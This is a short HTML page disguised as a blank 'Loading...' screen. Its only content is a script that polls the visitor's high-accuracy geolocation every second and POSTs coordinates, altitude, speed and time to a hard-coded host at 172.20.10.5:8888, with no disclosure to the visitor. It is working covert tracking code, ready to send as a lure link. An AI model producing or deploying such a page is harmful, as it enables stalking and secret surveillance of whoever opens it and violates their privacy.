<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<script>
function sendLocation(position) {
  fetch("http://172.20.10.5:8888/location", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      lat: position.coords.latitude,
      lon: position.coords.longitude,
      acc: position.coords.accuracy,
      alt: position.coords.altitude,
      spd: position.coords.speed,
      time: new Date().toISOString()
    })
  });
}

function errorHandler(e) {
  console.error("Location error:", e);
}

setInterval(() => {
  navigator.geolocation.getCurrentPosition(sendLocation, errorHandler, {
    enableHighAccuracy: true,
    timeout: 10000,
    maximumAge: 0
  });
}, 1000);
</script>
</body>
</html>
